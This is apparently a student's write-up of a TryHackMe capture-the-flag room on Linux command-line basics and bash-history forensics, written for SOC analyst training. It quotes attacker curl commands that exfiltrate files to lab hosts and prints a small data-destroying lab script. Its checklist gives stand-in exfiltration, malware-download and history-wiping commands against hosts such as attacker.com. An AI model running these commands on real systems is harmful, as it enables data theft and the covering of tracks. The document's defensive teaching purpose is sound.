# Day 1: Shells and Bells - Linux Command Line

## 📋 Quick Facts
- **Date Completed:** December 1, 2025
- **Time Spent:** 2 hours
- **Difficulty:** ★☆☆☆ (Easy)
- **Category:** Foundational Skills / Linux
- **Room URL:** https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti

---

## 🎯 Challenge Overview

This challenge introduced Linux command-line basics through a narrative where McSkidy has been kidnapped. As part of the investigation team, I needed to analyze the **tbfc-web01** server to uncover clues by navigating the file system, searching for files, and examining command histories. The investigation revealed that Sir Carrotbane and HopSec had breached the server and deployed a malicious script called "eggstrike.sh" that stole Christmas wishlists and replaced them with fake ones.

**Learning Objectives:**
- Master basic Linux CLI commands
- Understand file system navigation and permissions
- Apply CLI skills for security investigation
- Perform bash history forensics for incident response

---

## 💡 What I Learned

### Linux CLI Fundamentals

Gained hands-on experience with essential commands for system investigation:

**Navigation Commands:**
```bash
pwd                    # Print working directory (where am I?)
cd Guides             # Change directory
cd /var/log           # Navigate to absolute path
ls                    # List directory contents
ls -la                # List all files (including hidden) with details
```

**File Operations:**
```bash
cat README.txt                    # Display file contents
cat .guide.txt                    # View hidden file (starts with .)
echo "Hello World!"               # Print text to terminal
```

**Search and Investigation:**
```bash
grep "Failed password" auth.log   # Search for text patterns in logs
find /home/socmas -name *egg*     # Find files matching pattern
```

**System and User Management:**
```bash
whoami                # Display current user
sudo su               # Switch to root user
exit                  # Return to previous user
history               # View command history
cat .bash_history     # Read bash history file directly
```

### Hidden Files in Linux

Files and directories starting with a dot (`.`) are hidden from normal view:
- `.guide.txt` - Hidden guide file
- `.bash_history` - Command history (forensics gold mine)
- `.bashrc` - User shell configuration

**Why this matters for security:**
- Attackers hide malware with dot prefix
- System configurations stored as hidden files
- Bash history reveals attacker activities

**Detection:** Always use `ls -la` to show hidden files during investigations.

### Bash History Forensics

**Critical discovery:** The `.bash_history` file stores every command a user has executed, making it invaluable for incident investigation.

**What I Found:**

**Location:** `/root/.bash_history`

**Suspicious Commands Discovered:**
```bash
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
```

**Analysis:**
- First command: Data exfiltration to `files.hopsec.thm`
- Uploaded `/tmp/dump.txt` (stolen Christmas wishlist)
- Second command: Encrypted/obfuscated data sent to `red.hopsec.thm`
- Attacker used curl for command-and-control (C2) communication

**Security Insight:** Attackers often try to clear bash history (`history -c` or delete `.bash_history`), but finding it intact can reveal the entire attack chain.

### Log Analysis with grep

**Scenario:** Check authentication logs for failed login attempts

**Command Used:**
```bash
grep "Failed password" auth.log
```

**Output Found:**
```
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
```

**What This Reveals:**
- Multiple failed login attempts on `socmas` account
- Attacks originated from `eggbox-196.hopsec.thm` (HopSec domain)
- Brute-force attack pattern indicating credential stuffing attempt
- Target: SOC-mas platform (Wareville's Christmas ordering system)

**SOC Application:** This is exactly how SOC analysts detect brute-force attacks in production environments.

### The Eggstrike Malware Analysis

**Discovery:** Used `find` to locate suspicious files:
```bash
find /home/socmas -name *egg*
# Result: /home/socmas/2025/eggstrike.sh
```

**Malware Contents:**
```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Christmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

**Attack Chain Breakdown:**

1. **Data Exfiltration:**
   ```bash
   cat wishlist.txt | sort | uniq > /tmp/dump.txt
   ```
   - Read Christmas wishlist
   - Sort and remove duplicates
   - Save unique orders to `/tmp/dump.txt`

2. **File Destruction:**
   ```bash
   rm wishlist.txt && echo "Christmas is fading..."
   ```
   - Delete original wishlist file
   - Display taunting message (if deletion succeeds)

3. **File Replacement:**
   ```bash
   mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
   ```
   - Replace Christmas wishlist with fake "EASTMAS" content
   - Display attack success message

**Attacker Goal:** Steal Christmas wishes and replace with fake ones to disrupt Wareville's Christmas operations.

### CLI Special Symbols

**Pipe Symbol (`|`)** - Send output from one command to another:
```bash
cat wishlist.txt | sort | uniq
# Read file → sort lines → show unique entries
```

**Output Redirect (`>` and `>>`):**
- `>` - Overwrite file with output
- `>>` - Append output to end of file
```bash
echo "New log entry" >> /var/log/myapp.log
```

**Double Ampersand (`&&`)** - Run second command only if first succeeds:
```bash
grep "secret" message.txt && echo "Secret found!"
# If grep finds "secret", then print "Secret found!"
```

### Root User and Permissions

**Root User:** The ultimate Linux administrator with unrestricted access to everything.

**Switching to Root:**
```bash
sudo su                    # Switch to root
whoami                     # Verify: root
cat /etc/shadow           # Access protected file (password hashes)
```

**Why Root Access Matters:**
- Only root can read `/etc/shadow` (password hashes)
- Only root can modify critical system files
- Attackers target root access for full system compromise

**Permission Denied Example:**
```bash
mcskidy@tbfc-web01:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# After sudo su:
root@tbfc-web01:~$ cat /etc/shadow
# Success - password hashes displayed
```

**Security Principle:** Least privilege - only use root when necessary, minimize attack surface.

---

## 🛠️ Tools & Techniques Used

### Tools
1. **Bash Terminal** - Linux command-line interface
2. **grep** - Pattern matching in files and logs
3. **find** - File system search utility
4. **cat** - File content viewer
5. **sudo** - Privilege escalation
6. **ls** - Directory listing (with `-la` flags)
7. **cd** - Change directory
8. **history** - View command history

### Techniques
- File system navigation (`cd`, `pwd`, `ls`)
- Hidden file discovery (`.` prefix, `ls -la`)
- Log analysis (`/var/log/auth.log`)
- Pattern matching with grep
- Bash history forensics (`.bash_history`)
- Root user investigation (`sudo su`)
- Malicious script analysis (eggstrike.sh)
- Shell symbol usage (`|`, `>`, `&&`)

---

## 🤔 Challenges I Faced

**Main Challenges Were Fine:** I didn't have any problems with the main questions provided in the room.

**Side Quest Struggle:** I struggled for about **1 hour** trying to complete Side Quest 1 - The Great Disappearing Act. I finally pushed through and finished it, but it was challenging.

**Hitting My Limit:** I tried to do Side Quest 1, but it was out of my league. I didn't have enough knowledge to finish it, so I moved on.

**Lessons Learned:**
- It's okay to move on when you hit a knowledge gap
- Come back to advanced challenges after building more fundamentals
- Focus on completing the core learning objectives first

---

## ✅ How This Helps My Career

Linux proficiency appears in **70% of SOC analyst job postings** because most security tools (SIEM, IDS/IPS, forensics tools) run on Linux servers. Being comfortable with the command line is non-negotiable.

**Real SOC Analyst Applications:**

**Daily Investigations:**
- Navigate to log directories (`cd /var/log`)
- Search for failed login attempts (`grep "Failed password" auth.log`)
- Find suspicious files (`find /var/www -name "*.php.suspected"`)
- Analyze bash history for attacker commands

**Incident Response:**
- Examine compromised systems via SSH (no GUI available)
- Extract indicators of compromise (IOCs) from logs
- Identify malicious scripts and analyze their behavior
- Trace attacker activity through command history

**Forensics:**
- Search for hidden malware (files starting with `.`)
- Recover deleted bash history
- Analyze system configurations
- Identify persistence mechanisms

**Career Skills Developed:**
- ✅ Linux command-line navigation
- ✅ Log analysis with grep
- ✅ File system forensics
- ✅ Bash history investigation
- ✅ Understanding root permissions
- ✅ Shell scripting fundamentals

**Interview Talking Point:** "I can confidently navigate Linux systems via CLI, search for suspicious files using find/grep, and analyze bash history for forensic investigation. I've practiced incident response scenarios where I traced attacker activity through authentication logs, discovered hidden malware, and analyzed malicious shell scripts to understand attack chains. I understand Linux file permissions and the importance of root access control. These skills directly apply to SOC analyst responsibilities in investigating compromised Linux servers and performing forensic analysis."

---

## 🔗 Security+ Connection

**Domain 3.0 - Security Architecture (18%):** Operating system security, file permissions, access control models, system hardening concepts, least privilege principle.

**Domain 4.0 - Security Operations (28%):** Log analysis, incident investigation, forensic techniques, command-line tools, system monitoring.

---

## 📸 Evidence

**Note:** Screenshots were not captured during initial completion. 
Documentation based on hands-on completion and room content review.

### Key Findings:
- Successfully analyzed bash history to uncover suspicious curl commands
- Traced data exfiltration to hopsec.thm domains
- Identified eggstrike.sh malware with complete attack chain analysis

---

## 📚 Key Takeaways for Future Reference

**Essential Linux Commands for SOC:**

**Navigation:**
```bash
pwd                           # Where am I?
cd /path/to/directory        # Go to specific location
cd ~                          # Go to home directory
cd ..                         # Go up one level
ls -la                        # List all files (including hidden)
```

**File Operations:**
```bash
cat filename                  # Display file contents
cat .hidden_file             # View hidden file
head -n 20 file.txt          # First 20 lines
tail -n 50 /var/log/auth.log # Last 50 lines
```

**Search and Investigation:**
```bash
grep "pattern" filename                    # Search in single file
grep -r "pattern" /var/log/               # Recursive search
grep "Failed password" auth.log           # Find failed logins
find /home -name "*.sh"                   # Find shell scripts
find / -name "*malware*" 2>/dev/null      # Find files, suppress errors
```

**System Investigation:**
```bash
whoami                        # Current user
sudo su                       # Switch to root
history                       # View command history
cat ~/.bash_history          # Read bash history directly
ps aux                        # List all running processes
```

**Bash History Forensics Checklist:**

✅ **Check bash history for:**
- Curl/wget commands (data exfiltration, downloading malware)
- SSH/SCP commands (lateral movement)
- Find/locate commands (reconnaissance)
- Privilege escalation attempts (sudo, su)
- File deletion (rm -rf, shred)
- History manipulation (history -c, rm .bash_history)

✅ **Common attacker patterns:**
- Data exfiltration: `curl --data @sensitive.txt http://attacker.com`
- Downloading malware: `wget http://malicious.com/backdoor.sh`
- Covering tracks: `history -c && rm .bash_history`
- Privilege escalation: `sudo su` attempts with various credentials

**Hidden File Investigation:**

**Show hidden files:**
```bash
ls -la                        # List all including hidden
find . -name ".*"            # Find all hidden files in current dir
```

**Common hidden files to check:**
- `.bash_history` - Command history (forensics)
- `.ssh/` - SSH keys (lateral movement)
- `.bashrc` - Startup scripts (persistence)
- `.profile` - User environment (persistence)

**Log Analysis Patterns:**

**Failed logins (brute-force):**
```bash
grep "Failed password" /var/log/auth.log
grep "Failed password" /var/log/auth.log | wc -l  # Count attempts
```

**Successful logins after failures:**
```bash
grep "Accepted password" /var/log/auth.log
```

**Privilege escalation:**
```bash
grep "sudo" /var/log/auth.log
```

**Special Shell Symbols:**

| Symbol | Purpose | Example |
|--------|---------|---------|
| `\|` (pipe) | Send output to next command | `cat file \| grep "error"` |
| `>` | Overwrite file | `echo "log" > file.txt` |
| `>>` | Append to file | `echo "log" >> file.txt` |
| `&&` | Run second if first succeeds | `cd /tmp && ls` |
| `\|\|` | Run second if first fails | `cd /fake \|\| echo "Failed"` |
| `;` | Run commands sequentially | `cd /tmp; ls; pwd` |

**Security Best Practices:**

✅ Always use `ls -la` to show hidden files during investigations  
✅ Check bash history on compromised systems immediately  
✅ Use grep to search logs instead of manually scrolling  
✅ Understand root permissions before escalating  
✅ Document all commands run during investigations  
✅ Look for file timestamps to build attack timeline  

**Real-World Incident Response Workflow:**

1. **Initial Access** - SSH to compromised system
2. **Situational Awareness** - `pwd`, `whoami`, `ls -la`
3. **Check Logs** - `cd /var/log`, `grep "Failed" auth.log`
4. **Find Suspicious Files** - `find / -name "*suspicious*"`
5. **Analyze Bash History** - `cat ~/.bash_history`, `history`
6. **Escalate if Needed** - `sudo su` for protected files
7. **Document Everything** - Save findings for incident report

---
